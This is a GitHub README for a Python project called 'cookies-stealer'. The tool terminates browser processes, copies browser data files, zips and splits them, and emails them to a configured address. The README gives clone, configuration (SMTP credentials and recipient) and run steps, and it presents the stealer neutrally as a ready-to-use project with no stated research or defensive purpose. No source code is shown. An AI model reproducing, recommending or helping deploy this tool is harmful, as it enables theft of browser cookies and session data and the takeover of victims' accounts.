## 🔐 Explanation

This application is designed to extract browser data from the computer and send it via email. It terminates the browser processes, copies the data, compresses it into a ZIP file and splits the ZIP file into pieces if necessary. These pieces are then sent via email.

## Features

- Safely terminates browser processes.
- Copies data from specified browser file paths.
- Compresses data into a ZIP file and splits it into parts (20 MB each).
- Sends the ZIP file via email.
- Configurable email settings using a `.env` file.

## ⚙️ Setup

To run your project on your local machine, follow these steps:

### 🛠️ Requirements

- Python 3.x
- `psutil` - For managing system processes
- `shutil` - For file operations
- `zipfile` - For creating and managing ZIP files
- `smtplib` - For sending emails
- `python-dotenv` - For reading configuration from a `.env` file

### 🚀 Steps

1. **Clone this repository**: Open a terminal and run:
   ```bash
   git clone https://github.com/Uveys-Yakut/cookies-stealer.git
2. **Create a `.env` File**:
    ```bash
    EMAIL_HOST=smtp.gmail.com
    EMAIL_PORT=587
    EMAIL_ADDRESS=your-email@gmail.com
    EMAIL_PASSWORD=your-email-password
    EMAIL_TO=recipient-email@example.com
3. **Navigate to the Project Directory**: Install the required Python packages: 
   ```bash
   pip install -r requirements.txt
4. **Start the Application**: Run the application using:
   ```bash
   python main.py

## 📜 License

This project is licensed under the [MIT License](LICENSE)

## 👥 Contributors

**Uveys** - Project Manager and Developer

## 📧 Contact

For questions and feedback, you can reach me via email: uveysyakut859188@protonmail.com